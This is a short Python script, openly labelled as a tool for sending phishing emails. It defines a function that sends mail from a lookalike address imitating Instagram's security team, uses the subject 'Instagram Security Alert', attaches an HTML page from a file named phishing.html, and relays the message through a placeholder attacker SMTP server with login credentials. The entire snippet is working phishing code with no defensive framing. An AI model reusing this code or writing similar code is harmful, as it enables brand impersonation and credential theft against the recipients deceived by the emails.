# Send phishing emails using smtplib
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_phishing_email(to_email):
    msg = MIMEMultipart()
    msg['From'] = "security@instagram-security-alerts.com"
    msg['To'] = to_email
    msg['Subject'] = "Instagram Security Alert"
    
    with open('phishing.html', 'r') as f:
        msg.attach(MIMEText(f.read(), 'html'))
    
    s = smtplib.SMTP('smtp.attacker-server.com', 587)
    s.starttls()
    s.login("email@attacker-server.com", "password")
    s.send_message(msg)
    s.quit()